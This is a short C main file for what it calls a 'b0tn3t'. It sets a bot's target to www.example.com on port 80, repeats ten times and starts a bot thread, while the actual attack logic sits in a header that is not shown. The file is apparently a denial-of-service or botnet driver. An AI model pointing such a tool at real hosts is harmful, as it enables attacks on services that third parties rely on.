#include <stdio.h>
#include "bot.h"

int main()
{
	printf("b0tn3t\n");

	bot b;
	init_bot(&b);
	b.target_ip = "www.example.com";
	b.target_port = "80";
	b.times = 10;
	b.init_bot_thread(NULL, &b, &b);

	char c;
	scanf("%c", &c); // prevent the main function terminate after the thread is started

	return 0;
}